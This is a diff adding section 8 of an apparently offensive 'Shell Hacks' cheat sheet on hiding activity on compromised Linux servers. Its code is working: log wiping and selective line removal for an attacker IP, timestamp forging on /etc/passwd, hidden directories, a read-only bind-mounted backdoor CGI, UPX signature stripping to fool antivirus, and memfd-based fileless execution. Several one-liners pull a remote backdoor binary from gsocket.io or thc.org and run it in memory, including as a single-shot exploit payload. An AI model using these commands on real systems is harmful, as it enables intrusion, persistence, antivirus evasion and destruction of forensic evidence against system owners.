@@ -1,0 +1,168 @@
+Shell Hacks
+
+8.i. Shred & Erase a file
+
+shred -z foobar.txt
+
+## SHRED without shred command
+shred() {
+    [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
+    dd status=none bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
+    rm -f "${1:?}"
+}
+shred foobar.txt
+
+Note: Or deploy your files in /dev/shm directory so that no data is written to the harddrive. Data will be deleted on reboot.
+
+Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.
+
+8.ii. Restore the date of a file
+
+Let's say you have modified /etc/passwd but the file date now shows that /etc/passwd has been modified. Use touch to change the file date to the date of another file (in this example, /etc/shadow)
+
+touch -r /etc/shadow /etc/passwd
+# verify with 'stat /etc/passwd'
+
+Use hackshell and ctime /etc/passwd to also adjust the ctime and birth-time.
+
+8.iii. Clear logfile
+
+This will reset the logfile to 0 without having to restart syslogd etc:
+
+>/var/log/auth.log # or on old shells: cat /dev/null >/var/log/auth.log
+
+This will remove any line containing the IP 1.2.3.4 from the log file:
+
+xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
+
+Examples:
+
+# xlog "1\.2\.3\.4" /var/log/auth.log
+# xlog "${SSH_CLIENT%% *}" /var/log/auth.log
+# xlog "^2023.* thc\.org" foo.log
+
+8.iv. Hide files from that User without root privileges
+
+Our favorite working directory is /dev/shm/. This location is volatile memory and will be lost on reboot. NO LOGZ == NO CRIME.
+
+Hiding permanent files:
+
+Method 1:
+
+alias ls='ls -I system-dev'
+
+This will hide the directory system-dev from the ls command. Place in User's ~/.profile or system wide /etc/profile.
+
+Method 2: Tricks from the 80s. Consider any directory that the admin rarely looks into (like /boot/.X11/.. or so):
+
+mkdir '...'
+cd '...'
+
+Method 3: Unix allows filenames with about any ASCII character but 0x00. Try tab (\t). Happens that most Admins do not know how to cd into any such directory.
+
+mkdir $'\t'
+cd $'\t'
+
+8.v. Make a file immuteable
+
+This will redirect /var/www/cgi/blah.cgi to /boot/backdoor.cgi. The file blah.cgi can not be modified or removed (unless unmounted).
+
+# /boot/backdoor.cgi contains our backdoor
+touch /var/www/cgi/blah.cgi
+mount -o bind,ro /boot/backdoor.cgi /var/www/cgi/blah.cgi
+
+8.vi. Change user without sudo/su
+
+Needed for taking screenshots of X11 sessions (aka xwd -display :0 -silent -root | convert - jpg:screenshot.jpg or import -display :0 -window root screenshot.png)
+
+xsu() {
+    local name="${1:?}"
+    local u g h
+    local cmd="python"
+
+    command -v python3 >/dev/null && cmd="python3"
+    [ $UID -ne 0 ] && { HS_ERR "Need root"; return; }
+    u=$(id -u ${name:?}) || return
+    g=$(id -g ${name:?}) || return
+    h="$(grep "^${name}:" /etc/passwd | cut -d: -f6)" || return
+    HOME="${h:-/tmp}" "$cmd" -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
+}
+# xsu user
+
+8.vii. Obfuscate and crypt paypload
+
+Use UPX to pack an ELF binary (example /bin/id):
+
+BIN="mybin"
+upx -qqq /bin/id -o "${BIN}"
+
+Cleanse the UPX header and 2nd ELF header to fool the Anti-Virus:
+
+perl -i -0777 -pe 's/^(.{64})(.{0,256})UPX!.{4}/$1$2\0\0\0\0\0\0\0\0/s' "${BIN}"
+perl -i -0777 -pe 's/^(.{64})(.{0,256})\x7fELF/$1$2\0\0\0\0/s' "${BIN}"
+
+Optionally cleanse signatures and traces of UPX:
+
+cat "${BIN}" \
+| perl -e 'local($/);$_=<>;s/(.*)(\$Info:[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' \
+| perl -e 'local($/);$_=<>;s/(.*)(\$Id:[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' >"${BIN}.tmpupx"
+mv "${BIN}.tmpupx" "${BIN}"
+grep -Eqm1 "PROT_EXEC\|PROT_WRITE" "${BIN}" \
+&& cat "${BIN}" | perl -e 'local($/);$_=<>;s/(.*)(PROT_EXEC\|PROT_WRI[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' >"${BIN}.tmpupx" \
+&& mv "${BIN}.tmpupx" "${BIN}"
+perl -i -0777 -pe 's/UPX!/\0\0\0\0/sg' "${BIN}"
+
+Verify that binary can not be unpacked:
+
+upx -d "${BIN}"  # Should fail with 'not packed by UPX'
+
+Optionally encrypt it with bincrypter.
+
+8.viii. Deploying a backdoor without touching the file-system
+
+Start a backdoor without writing to the file-system or when all writeable locations are mounted with the evil noexec-flag.
+
+A Perl one-liner to load a binary into memory and execute it (without touching any disk or /dev/shm or /tmp). See Hackshell for more.
+
+memexec() {
+    local stropen strread
+    local strargv0='"foo", '
+    [ -t 0 ] && {
+        stropen="open(\$i, '<', '$1') or die 'open: \$!';"
+        strread='$i'
+        unset strargv0
+    }
+    # Check Syscall-NR: perl -e 'require "sys/syscall.ph"; printf &SYS_memfd_create;'
+    perl -e '$f=syscall(319, $n="", 1);
+if(-1==$f){ $f=syscall(279, $n="", 1); if(-1==$f){ die "memfd_create: $!";}}
+'"${stropen}"'
+open($o, ">&=".$f) or die "open: $!";
+while(<'"${strread:-STDIN}"'>){print $o $_;}
+exec {"/proc/$$/fd/$f"} '"${strargv0}"'@ARGV or die "exec: $!";' -- "$@"
+}
+# Example usage:
+# memexec /usr/bin/id -u
+# cat /usr/bin/id | memexec -u
+# curl -SsfL https://thc.org/my-backdoor-binary | memexec
+
+The shortest possible variant is (example):
+
+memexec(){ perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- "$@";}
+# Example: cat /usr/bin/id | memexec -u
+
+(Thank you tmp.Out for some educated discussions and previous work by others)
+
+Deploy gsocket without writing to the filesystem (example):
+
+GS_ARGS="-ilqD -s SecretChangeMe31337" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m))
+
+The backdoor can also be piped via SSH directly into the remote's memory, and executed:
+
+MX='-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255'
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | ssh root@foobar "exec perl '$MX' -- -ilqD -s SecretChangeMe31337"
+
+If you have a single-shot at remote executing a command (like via a PHP exploit) then this is your line:
+
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)|perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- -ilqD -s SecretChangeMe31337
+
+
